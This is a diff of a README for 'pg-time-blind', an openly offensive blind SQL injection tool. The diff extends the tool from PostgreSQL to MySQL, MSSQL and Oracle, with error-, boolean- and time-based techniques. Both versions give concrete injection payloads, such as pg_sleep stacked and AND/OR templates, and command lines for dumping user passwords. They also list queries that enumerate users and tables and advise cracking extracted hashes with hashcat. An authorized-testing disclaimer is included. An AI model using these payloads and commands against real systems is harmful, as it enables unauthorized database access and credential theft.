@@ -1,59 +1,57 @@
 # pg-time-blind
 
-A small, dependency-light **PostgreSQL blind SQL injection** data extractor.
+A small, dependency-light **blind SQL injection extractor** with **automatic DBMS
+detection** and **three techniques**, chosen for you.
 
-When a target only leaks data through *whether a condition is true* — either by
-changing the response (**boolean-based**) or by how long it takes to respond
-(**time-based** `pg_sleep` oracle) — this tool pulls a value out automatically in
-one command, no sqlmap. It binary-searches the ASCII value of each character
-(~7 requests/char instead of brute-forcing all 95 printable characters), so
-extraction is fast and predictable.
+Point it at any injectable parameter and it works out *where* the injection breaks
+out, *which database* is behind it, and the *fastest way* to pull data — then dumps
+the value. No sqlmap; only `requests`.
 
-It is deliberately **generic**: the injection point, HTTP method, parameter name,
-and payload shape are all configurable, so it works against any PostgreSQL target
-with a blind injection — not just one specific app.
+> The name is historical (it began life as a PostgreSQL time-based tool). It now
+> supports PostgreSQL, MySQL, MSSQL and Oracle, and error/boolean/time techniques.
 
 ---
 
 ## ⚠️ Legal / ethical use
 
-This tool is for **authorized security testing and education only** — your own systems,
-lab machines (e.g. OffSec Proving Grounds, HackTheBox), or targets you have **explicit written
-permission** to test. Unauthorized access to computer systems is illegal in most jurisdictions.
-You are solely responsible for how you use it. The author accepts no liability for misuse.
+For **authorized security testing and education only** — your own systems, lab machines
+(OffSec PG, HackTheBox), or targets you have **explicit written permission** to test.
+Unauthorized access is illegal in most jurisdictions. You alone are responsible for use.
 
 ---
 
-## What's new (v2 — structured detection)
+## How it works — two phases
 
-The tool now runs in **two phases** instead of assuming a single time-based preset:
+**Phase 1 — Detection**
 
-1. **Detection** — it auto-discovers the injection **context** *and* the blind **type**:
-   - **Boolean-based** is tried first because it needs no waiting (much faster). TRUE vs
-     FALSE is told apart by **auto-calibration**: the tool sends a known-true and a
-     known-false payload and diffs **status code → body length → a unique body token**
-     to pick a reliable discriminator.
-   - **Time-based** (`pg_sleep`) is used as a **fallback** when boolean produces no signal.
-2. **Extraction** — uses whichever oracle was detected, with the same per-character binary search.
+1. **Context** — finds how the injection breaks out: string vs numeric, `AND` / `OR`, or stacked.
+2. **DBMS** — fingerprints the backend automatically (PostgreSQL, MySQL, MSSQL, Oracle).
+3. **Technique** — picks the fastest available:
+   - **error-based** — forces a DB error that reflects the value; dumps it in **one request**.
+   - **boolean-based** — auto-calibrates a TRUE/FALSE signal (status code → body length → digit-stripped token).
+   - **time-based** — `pg_sleep` / `SLEEP` / `WAITFOR` oracle; last resort.
 
-You no longer have to guess `--preset`; the context (`stacked`, `string-and`, `string-or`,
-`numeric-and`, `numeric-or`) is detected for you. You can still pin everything manually.
+**Phase 2 — Extraction**
+
+- **error-based**: whole value in one shot (chunked automatically when the DBMS truncates
+  its error text, e.g. MySQL `extractvalue` ≈ 32 chars).
+- **boolean / time**: per-character binary search (~7 requests/char). Boolean extraction
+  can run in parallel with `--threads`.
 
 ---
 
-## Features
+## Safety
 
-- **Auto-detects boolean-based *and* time-based** blind injection, preferring the faster boolean path
-- **Auto-calibration** of the TRUE/FALSE signal (status code / body length / body token)
-- Auto-discovers the injection **context** (no manual `--preset`)
-- Binary search per character (~7 requests/char)
-- Inject into **URL**, **body**, or a **header** via a placeholder marker
-- Works with `GET`, `POST`, or any method
-- Manual overrides: `--context`, `--force-boolean`, `--force-time`, `--true-match`, `--false-match`, custom `--template`
-- Load a raw Burp/ZAP request file with `--request`
-- **Resume/checkpoint**: progress is saved per character — re-run the same command to continue after an interruption
-- Jitter-resistant time mode: re-confirms positives (`--retries`)
-- No heavy dependencies — just `requests`
+`OR`-based contexts can change application state (`' OR 1=1` may match every row / log you
+in). They are **disabled by default**. Pass `--allow-or` to include them.
+
+---
+
+## Resume / memory
+
+Progress **and** the detected DBMS/technique/context are checkpointed after every character.
+If a run is interrupted, re-run the **same command** to resume. `--fresh` ignores a
+checkpoint; `--state PATH` chooses the file. It is deleted automatically on success.
 
 ---
 
@@ -79,111 +77,83 @@ python3 pg_time_blind.py --help
 
 ---
 
-## How it works
-
-1. You mark the injection point in the request with a placeholder (default: `INJECT`).
-2. **Phase 1 — detection.** For each candidate context the tool builds a known-TRUE and
-   known-FALSE payload:
-   - It first checks for a **boolean** signal by calibrating on the responses
-     (different status code, a stable body-length gap, or a token that only appears in one).
-   - If no boolean signal is found, it checks whether a TRUE condition **delays** the
-     response (and a FALSE one doesn't) → **time-based**.
-3. **Phase 2 — extraction.** Using the detected true/false oracle it finds the value's
-   length, then binary-searches each character by its ASCII code.
-
-Example of a generated payload (time-based, `stacked` context):
-
-```sql
-';SELECT pg_sleep(3) WHERE ascii(substr((SELECT password FROM users WHERE username='bob'),1,1))>77--
-```
-
-Example of a generated payload (boolean, `string-and` context):
-
-```sql
-' AND (ascii(substr((SELECT password FROM users WHERE username='bob'),1,1))>77)--
-```
-
----
-
 ## Usage
 
 ```
-python3 pg_time_blind.py --query "<SQL scalar>" [target] [detection opts] [tuning]
+python3 pg_time_blind.py --query "<SQL scalar>" [target] [detection] [tuning]
 ```
 
 ### Target (choose one style)
 
 | Flag | Meaning |
 |------|---------|
-| `-u, --url`      | Target URL (may contain the marker for GET injection) |
-| `-d, --data`     | Request body (may contain the marker) |
-| `-H, --header`   | Extra header `'Name: value'`, repeatable (may contain the marker) |
-| `-X, --method`   | HTTP method (default: `POST` if `-d` given, else `GET`) |
-| `--request`      | Raw HTTP request file containing the marker |
-| `--proto`        | Scheme for `--request` files (default `http`) |
+| `-u, --url`    | Target URL (may contain the marker for GET injection) |
+| `-d, --data`   | Request body (may contain the marker) |
+| `-H, --header` | Extra header `'Name: value'`, repeatable (may contain the marker) |
+| `-X, --method` | HTTP method (default: `POST` if `-d` given, else `GET`) |
+| `--request`    | Raw HTTP request file containing the marker |
+| `--proto`      | Scheme for `--request` files (default `http`) |
 
 ### Injection
 
 | Flag | Meaning |
 |------|---------|
 | `--query`     | **(required)** SQL scalar to extract, e.g. `"SELECT password FROM users WHERE username='bob'"` |
-| `--marker`    | Placeholder string for the injection point (default `INJECT`) |
-| `--template`  | Custom payload template using `{cond}` (and `{sleep}` for time-based); overrides context discovery |
+| `--marker`    | Placeholder for the injection point (default `INJECT`) |
 | `--no-encode` | Do **not** URL-encode the payload |
 
 ### Detection
 
 | Flag | Meaning |
 |------|---------|
-| `--context`        | Pin the injection context: `stacked`, `string-and`, `string-or`, `numeric-and`, `numeric-or` (skips context discovery) |
-| `--force-boolean`  | Only use boolean-based blind |
-| `--force-time`     | Only use time-based blind |
-| `--true-match`     | String present **only** in a TRUE response (overrides auto-calibration) |
-| `--false-match`    | String present **only** in a FALSE response (overrides auto-calibration) |
-| `--len-margin`     | Min body-length gap (chars) to treat as a boolean signal (default `12`) |
-| `--len-jitter`     | Allowed body-length wobble within one response type (default `4`) |
+| `--dbms`          | Pin the DBMS: `postgresql`, `mysql`, `mssql`, `oracle` (skips fingerprinting) |
+| `--force-boolean` | Only use boolean-based |
+| `--force-time`    | Only use time-based |
+| `--no-error`      | Don't use error-based even if available |
+| `--allow-or`      | Include risky `OR` contexts (may change app state) |
+| `--true-match`    | String present **only** in a TRUE response (overrides calibration) |
+| `--false-match`   | String present **only** in a FALSE response |
+| `--len-margin`    | Min body-length gap to treat as a boolean signal (default `12`) |
+| `--len-jitter`    | Allowed body-length wobble within one response type (default `4`) |
 
 ### Tuning
 
 | Flag | Default | Meaning |
 |------|---------|---------|
-| `--sleep`     | `3.0` | Seconds for `pg_sleep` (time-based only) |
-| `--threshold` | `sleep*0.6` | Response time counted as "slept" |
-| `--retries`   | `1` | Re-confirm each time-based positive N times (beats network jitter) |
-| `--maxlen`    | `64` | Max value length to probe |
+| `--sleep`       | `3.0` | Seconds for the time-based sleep |
+| `--threshold`   | `sleep*0.6` | Response time counted as "slept" |
+| `--retries`     | `1` | Re-confirm each time-based positive N times (beats jitter) |
+| `--threads`     | `1` | Parallel workers for **boolean** extraction |
+| `--maxlen`      | `64` | Max value length to probe |
 | `--cmin/--cmax` | `32/126` | ASCII bounds for the binary search |
-| `--proxy`     | – | e.g. `http://127.0.0.1:8080` to view in Burp |
+| `--proxy`       | – | e.g. `http://127.0.0.1:8080` to view in Burp |
 
 ### Resume
 
 | Flag | Meaning |
 |------|---------|
-| `--state` | Checkpoint file path (default: auto-named `.pgtb-<id>.json` in the current dir) |
+| `--state` | Checkpoint file path (default: auto-named `.pgtb-<id>.json`) |
 | `--fresh` | Ignore any existing checkpoint and start over |
 
 ---
 
-## Injection contexts
+## DBMS support matrix
 
-The detector tries these in order (`foo` = the original value). Each has a boolean form
-and/or a time form; boolean is preferred when it produces a signal.
+| DBMS | Fingerprint | Error-based | Boolean | Time-based |
+|------|-------------|-------------|---------|------------|
+| PostgreSQL | `pg_catalog` | `CAST(... AS int)` | ✅ | `pg_sleep` (inline + stacked) |
+| MySQL | `CONNECTION_ID()` | `extractvalue` (chunked) | ✅ | `SLEEP` (inline) |
+| MSSQL | `@@version` | `CAST/convert` | ✅ | `WAITFOR DELAY` (stacked) |
+| Oracle | `v$version` | – | ✅ | – |
 
-| Context       | Boolean payload            | Time payload |
-|---------------|----------------------------|--------------|
-| `stacked`     | *(time only)*              | `foo';SELECT pg_sleep(s) WHERE {cond}--` |
-| `string-and`  | `foo' AND ({cond})--`      | `foo' AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep(s)) ELSE 1 END)=1--` |
-| `string-or`   | `foo' OR ({cond})--`       | `foo' OR (CASE WHEN ({cond}) THEN ...)=1--` |
-| `numeric-and` | `foo AND ({cond})--`       | `foo AND (CASE WHEN ({cond}) THEN ...)=1--` |
-| `numeric-or`  | `foo OR ({cond})--`        | `foo OR (CASE WHEN ({cond}) THEN ...)=1--` |
-
-Need something unusual (extra parentheses, different comment, no closing quote)? Use
-`--template` with your own string containing `{cond}` (add `{sleep}` for time-based).
+Oracle uses boolean extraction (its inline time/error primitives are intentionally left
+out for reliability). Pin any backend with `--dbms` to skip fingerprinting.
 
 ---
 
 ## Examples
 
-**1. Login form, POST body — fully automatic (detect context + type, then extract)**
+**1. Fully automatic — detect context, DBMS and technique, then extract**
 
 ```bash
 python3 pg_time_blind.py \
@@ -195,41 +165,29 @@ python3 pg_time_blind.py \
 **2. Reuse a saved Burp request** (put `INJECT` where the payload goes)
 
 ```bash
-python3 pg_time_blind.py --request req.txt \
-  --query "SELECT current_user"
+python3 pg_time_blind.py --request req.txt --query "SELECT current_user"
 ```
 
-**3. Numeric GET parameter, pin the context, force time-based**
+**3. Pin MySQL, allow risky OR contexts**
 
 ```bash
-python3 pg_time_blind.py \
-  -u "http://target/item?id=INJECT" \
-  --force-time --context numeric-and \
+python3 pg_time_blind.py --request req.txt --dbms mysql --allow-or \
+  --query "SELECT current_user()"
+```
+
+**4. Speed up boolean extraction with 8 workers**
+
+```bash
+python3 pg_time_blind.py -u "http://target/item?id=INJECT" --threads 8 \
   --query "SELECT version()"
 ```
 
-**4. Header injection**
-
-```bash
-python3 pg_time_blind.py -u http://target/ \
-  -H "X-Forwarded-For: INJECT" \
-  --query "SELECT usename FROM pg_user LIMIT 1"
-```
-
-**5. Help the boolean calibrator on a noisy page**
+**5. Force time-based and help the calibrator on a noisy page**
 
 ```bash
 python3 pg_time_blind.py -u http://t/login -d "username=INJECT&password=x" \
-  --true-match "Dashboard" \
+  --force-time --true-match "Dashboard" \
   --query "SELECT current_user"
-```
-
-**6. Custom template (full control, time-based)**
-
-```bash
-python3 pg_time_blind.py -u http://t/x -d "q=INJECT" \
-  --template "1)) AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1-- -" \
-  --query "SELECT string_agg(usename,',') FROM pg_user"
 ```
 
 ---
@@ -238,72 +196,59 @@ python3 pg_time_blind.py -u http://t/x -d "q=INJECT" \
 
 ```
 === PHASE 1: detection ===
-[*] probing boolean   : string-and ...
+[*] boolean probe : string-and ...
 [+] boolean signal on string-and: status==302
+[+] DBMS fingerprint: postgresql
+[+] error reflection on string-and (postgresql)
 
-[+] TYPE   : boolean-based
-[+] DETAIL : context=string-and signal=status==302
-[*] detection cost: 8 requests
+[+] DBMS      : postgresql
+[+] TECHNIQUE : error-based
+[+] CONTEXT   : string-and
+[*] detection cost: 11 requests
 
 === PHASE 2: extraction ===
-[*] query  : SELECT password FROM users WHERE username='admin'
-[*] state  : .pgtb-a1b2c3d4e5.json
-[+] length = 11
-[*] extracting: s3cr3tP@ss!
+[*] query : SELECT password FROM users WHERE username='admin'
 
 [+] RESULT: s3cr3tP@ss!
-[*] total requests: 84  (type: boolean-based)
+[*] total requests: 12  (error-based, postgresql)
 ```
 
-When no boolean signal exists, Phase 1 falls back automatically:
+When nothing reflects and boolean has no signal, it falls back to time:
 
 ```
-=== PHASE 1: detection ===
-[*] probing boolean   : string-and ...
-[*] probing boolean   : string-or ...
-[*] probing boolean   : numeric-and ...
-[*] probing boolean   : numeric-or ...
-[*] probing time      : stacked ...
-[+] time-based fires on stacked
-
-[+] TYPE   : time-based
-[+] DETAIL : context=stacked sleep=3.0s threshold=1.80s
+[+] DBMS      : postgresql
+[+] TECHNIQUE : time-based
+[+] CONTEXT   : stacked
 ```
 
 ---
 
 ## Useful queries to feed `--query`
 
-| Goal | `--query` value |
-|------|-----------------|
-| Current DB user | `SELECT current_user` |
-| Version | `SELECT version()` |
-| Current database | `SELECT current_database()` |
-| Is superuser | `SELECT current_setting('is_superuser')` |
-| List users | `SELECT string_agg(usename,',') FROM pg_user` |
-| List tables | `SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'` |
-| Dump a password | `SELECT password FROM users WHERE username='admin'` |
+| Goal | PostgreSQL / MySQL | MSSQL | Oracle |
+|------|--------------------|-------|--------|
+| Current user | `SELECT current_user` | `SELECT SYSTEM_USER` | `SELECT user FROM dual` |
+| Version | `SELECT version()` | `SELECT @@version` | `SELECT banner FROM v$version WHERE rownum=1` |
+| Current DB | `SELECT current_database()` / `SELECT database()` | `SELECT DB_NAME()` | `SELECT ora_database_name FROM dual` |
+| List users | `SELECT string_agg(usename,',') FROM pg_user` | `SELECT name FROM sys.sql_logins` | `SELECT username FROM all_users` |
+| Dump a password | `SELECT password FROM users WHERE username='admin'` | same | same |
 
 ---
 
 ## Tips
 
-- **Boolean is faster than time** — let detection pick it. Only `--force-time` when the page
-  is too dynamic to calibrate a reliable true/false difference.
-- If auto-calibration mis-fires on a noisy page (CSRF tokens, timestamps), give it a hand with
-  `--true-match`/`--false-match`, or raise `--len-margin`.
-- If the result is a **hash**, extract it here, then crack it offline (e.g.
-  `hashcat -m <mode> hash.txt rockyou.txt`) — far faster than guessing through the oracle.
-- Raise `--sleep` (e.g. `5`) on slow/jittery networks for time-based; lower it (e.g. `2`) on fast local labs.
-- Interrupted? Just re-run the **same** command — it resumes from the last extracted character.
-- If detection finds nothing, your context or marker placement is likely wrong — not necessarily that the target is safe. Try `--context`, `--force-time`, or `--true-match`.
+- **Let detection choose** — error-based is fastest, boolean next, time last. Override only when needed.
+- If calibration mis-fires on a dynamic page (CSRF tokens, timestamps), use `--true-match`/`--false-match` or raise `--len-margin`.
+- If the result is a **hash**, extract it then crack offline (`hashcat -m <mode> hash.txt rockyou.txt`).
+- Raise `--sleep` on slow/jittery networks for time-based; keep `--threads` modest to avoid overwhelming the target.
+- Interrupted? Re-run the **same** command to resume.
+- Found nothing? Try `--allow-or`, `--dbms`, `--force-time`, or check marker placement — not necessarily that the target is safe.
 
 ---
 
 ## Contributing
 
-Issues and PRs welcome — especially additional contexts and other-DBMS support
-(MySQL `SLEEP()`, MSSQL `WAITFOR DELAY`, Oracle `dbms_pipe.receive_message`).
+Issues and PRs welcome — especially Oracle error/time primitives and additional contexts.
 
 ## License
 
